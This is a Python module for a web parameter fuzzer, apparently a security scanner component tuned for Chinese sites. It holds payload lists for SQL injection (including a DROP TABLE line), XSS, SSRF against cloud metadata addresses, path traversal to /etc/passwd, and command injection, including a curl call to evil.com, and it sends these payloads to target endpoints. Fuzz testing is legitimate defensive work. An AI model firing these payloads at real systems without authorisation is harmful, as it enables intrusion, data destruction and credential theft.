"""
Domestic Fuzz Tester Module
国内增强参数Fuzz模块 - 使用国内站点的增强Fuzz字典进行测试
"""

import asyncio
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass

from core.models import APIEndpoint


@dataclass
class FuzzResult:
    """Fuzz测试结果"""
    endpoint: str
    method: str
    parameter: str
    original_value: str
    fuzz_value: str
    status_code: int
    response_length: int
    is_anomalous: bool
    anomaly_type: str = ""


class DomesticFuzzTester:
    """
    国内增强参数Fuzz测试器
    使用针对国内站点的Fuzz字典进行测试
    """
    
    DEFAULT_PARAMS = {
        'id': ['1', '100', '1000', '999999', 'admin', '0', '-1', 'null'],
        'user_id': ['1', '1001', '10001', '99999', '0', 'admin'],
        'page': ['1', '2', '10', '100', '999', '0', '-1'],
        'page_num': ['1', '2', '10', '100'],
        'page_size': ['10', '20', '50', '100', '999', '0', '-1'],
        'size': ['10', '20', '50', '100', '500'],
        'limit': ['10', '20', '50', '100', '1000'],
        'offset': ['0', '1', '10', '100', '1000'],
        'keyword': ['test', 'admin', 'select', 'update', 'delete', '\' OR \'1\'=\'1', '1=1'],
        'query': ['test', 'admin', 'select', 'update', 'delete', '\' OR \'1\'=\'1'],
        'search': ['test', 'admin', 'select', 'update', 'delete', '1=1'],
        'q': ['test', 'admin', '123456', '1=1', '\' OR \'1\'=\'1'],
        'order': ['asc', 'desc', 'ASC', 'DESC', '1', '0'],
        'sort': ['asc', 'desc', 'id', 'create_time', 'update_time'],
        'status': ['0', '1', 'true', 'false', 'True', 'False', 'yes', 'no', 'on', 'off'],
        'type': ['1', '2', '10', '100', 'admin', 'vip'],
        'category': ['1', '2', '10', '100', 'news', 'article'],
        'tag': ['1', '2', '10', 'test', 'admin'],
        'channel': ['1', '2', '10', '100'],
        'level': ['1', '2', '10', '100', 'admin', 'vip', 'super'],
        'role': ['1', '2', 'admin', 'user', 'vip', 'super'],
        'vip': ['0', '1', 'true', 'false'],
        'admin': ['0', '1', 'true', 'false'],
        'pageIndex': ['1', '2', '10'],
        'pageCount': ['10', '20', '50', '100'],
        'start': ['0', '1', '10', '100'],
        'end': ['10', '100', '1000', '999999'],
        'date': ['2024-01-01', '2024-12-31', '2023-01-01'],
        'time': ['2024-01-01 00:00:00', '2024-12-31 23:59:59'],
        'token': ['test', 'admin', '123456', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'],
        'file': ['test.txt', '../etc/passwd', '..%2F..%2Fetc%2Fpasswd', '<script>alert(1)</script>'],
        'name': ['test', 'admin', '张三', '1=1', '\' OR \'1\'=\'1'],
        'username': ['admin', 'test', '123456', '\' OR \'1\'=\'1', 'admin\'--'],
        'password': ['admin', '123456', 'test', 'password', '12345678'],
        'email': ['test@test.com', 'admin@test.com', '1@1.com', '\' OR \'1\'=\'1'],
        'phone': ['13800138000', '13900139000', '12345678901', '10086', '10010'],
        'mobile': ['13800138000', '13900139000', '12345678901'],
        'id_card': ['110101199001011234', '11010119900101123X'],
        'code': ['1234', '123456', '000000', 'admin', 'test'],
        'auth_code': ['1234', '123456', '000000'],
        'verify_code': ['1234', '123456', '000000'],
        'captcha': ['1234', '123456', '000000', 'abcd'],
        'uuid': ['12345678-1234-1234-1234-123456789012', 'test-uuid-1234'],
        'uid': ['1', '1001', '10001', '99999', '0', 'admin'],
        'gid': ['1', '100', '1000', 'admin', 'vip'],
        'cid': ['1', '10', '100', '1000'],
        'tid': ['1', '10', '100', '1000'],
        'sid': ['1', '10', '100', '1000'],
        'pid': ['1', '10', '100', '1000'],
        'bid': ['1', '10', '100', '1000'],
        'acid': ['1', '10', '100', '1000'],
        'appid': ['wx1234567890abcdef', 'wxabcdef1234567890'],
        'app_id': ['wx1234567890abcdef', 'wxabcdef1234567890'],
        'openid': ['oABCD1234567890abcdef', 'test_openid_1234'],
        'open_id': ['oABCD1234567890abcdef', 'test_openid_1234'],
        'unionid': ['test_unionid_123456', 'oABCD1234567890abcdef'],
        'access_token': ['test_token_1234', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'],
        'refresh_token': ['test_refresh_token_1234'],
    }
    
    FUZZ_PAYLOADS = {
        'sql_injection': [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'#",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1",
            "'; DROP TABLE users--",
            "'; SELECT * FROM users--",
            "1' AND SLEEP(5)--",
        ],
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
        ],
        'ssrf': [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",
            "http://metadata.tencentyun.com",
            "http://100.100.100.200",
            "http://oss-cn-hangzhou.aliyuncs.com",
        ],
        'idor': [
            "999999",
            "0",
            "-1",
            "1000000",
            "../admin",
            "../../etc/passwd",
        ],
        'command_injection': [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| curl http://evil.com",
        ],
    }
    
    def __init__(self, http_client: Any = None, dict_path: Optional[str] = None):
        """
        初始化国内Fuzz测试器
        
        Args:
            http_client: HTTP客户端
            dict_path: 自定义参数字典路径
        """
        self.http_client = http_client
        self.dict_path = dict_path
        self.params = self.DEFAULT_PARAMS.copy()
        
        if dict_path:
            self._load_custom_dict(dict_path)
    
    def _load_custom_dict(self, dict_path: str) -> None:
        """加载自定义字典"""
        import yaml
        try:
            with open(dict_path, 'r', encoding='utf-8') as f:
                custom_dict = yaml.safe_load(f)
                if isinstance(custom_dict, dict):
                    for key, values in custom_dict.items():
                        if isinstance(values, list):
                            if key in self.params:
                                self.params[key].extend(values)
                            else:
                                self.params[key] = values
        except Exception as e:
            print(f"Failed to load custom dict: {e}")
    
    async def fuzz_parameters(self, endpoint: APIEndpoint) -> List[FuzzResult]:
        """
        对端点进行参数Fuzz
        
        Args:
            endpoint: API端点
            
        Returns:
            List[FuzzResult]: Fuzz结果列表
        """
        results = []
        
        if not endpoint.parameters:
            endpoint.parameters = self._guess_parameters(endpoint)
        
        for param_name in endpoint.parameters:
            param_values = self.params.get(param_name, ['test', '1', 'admin'])
            
            for fuzz_value in param_values[:5]:
                result = await self._fuzz_single_param(endpoint, param_name, fuzz_value)
                if result and result.is_anomalous:
                    results.append(result)
        
        return results
    
    async def _fuzz_single_param(self, endpoint: APIEndpoint, param_name: str, fuzz_value: str) -> Optional[FuzzResult]:
        """Fuzz单个参数"""
        if not self.http_client:
            return None
        
        try:
            response = await self.http_client.request(
                endpoint.full_url,
                method=endpoint.method,
                params={param_name: fuzz_value} if '?' not in endpoint.full_url else None
            )
            
            is_anomalous, anomaly_type = self._detect_anomaly(
                response.status_code,
                len(response.content) if response.content else 0,
                response.content if response.content else ''
            )
            
            return FuzzResult(
                endpoint=endpoint.full_url,
                method=endpoint.method,
                parameter=param_name,
                original_value='',
                fuzz_value=fuzz_value,
                status_code=response.status_code,
                response_length=len(response.content) if response.content else 0,
                is_anomalous=is_anomalous,
                anomaly_type=anomaly_type
            )
        except Exception:
            return None
    
    def _guess_parameters(self, endpoint: APIEndpoint) -> List[str]:
        """猜测可能存在的参数"""
        common_params = set()
        
        path_lower = endpoint.path.lower()
        
        for key in self.params.keys():
            if key in path_lower:
                common_params.add(key)
        
        id_patterns = [r'/(\d+)', r'/user/(\d+)', r'/article/(\d+)']
        for pattern in id_patterns:
            import re
            if re.search(pattern, endpoint.path):
                common_params.add('id')
                common_params.add('uid')
        
        return list(common_params) if common_params else ['id', 'page', 'keyword']
    
    def _detect_anomaly(self, status_code: int, content_length: int, content: str) -> tuple:
        """检测异常"""
        if status_code == 500:
            return True, "server_error"
        
        if 'sql' in content.lower() and 'syntax' in content.lower():
            return True, "sql_error"
        
        if '<script>' in content.lower() and 'alert' in content.lower():
            return True, "xss_reflected"
        
        if 'database' in content.lower() and 'error' in content.lower():
            return True, "db_error"
        
        if 'root:' in content or '/etc/passwd' in content:
            return True, "file_leak"
        
        if content_length > 1000000:
            return True, "large_response"
        
        return False, ""
    
    def get_all_params(self) -> Dict[str, List[str]]:
        """获取所有参数字典"""
        return self.params
    
    def add_param(self, name: str, values: List[str]) -> None:
        """添加参数"""
        if name in self.params:
            self.params[name].extend(values)
        else:
            self.params[name] = values
    
    def get_fuzz_payloads(self, category: str) -> List[str]:
        """获取指定类别的Fuzz payload"""
        return self.FUZZ_PAYLOADS.get(category, [])
    
    async def fuzz_with_payloads(self, endpoint: APIEndpoint, category: str = 'sql_injection') -> List[FuzzResult]:
        """
        使用指定类别的payload进行Fuzz
        
        Args:
            endpoint: API端点
            category: payload类别
            
        Returns:
            List[FuzzResult]: Fuzz结果列表
        """
        results = []
        
        if not endpoint.parameters:
            endpoint.parameters = self._guess_parameters(endpoint)
        
        payloads = self.get_fuzz_payloads(category)
        
        for param_name in endpoint.parameters:
            for payload in payloads:
                result = await self._fuzz_single_param(endpoint, param_name, payload)
                if result and result.is_anomalous:
                    results.append(result)
        
        return results
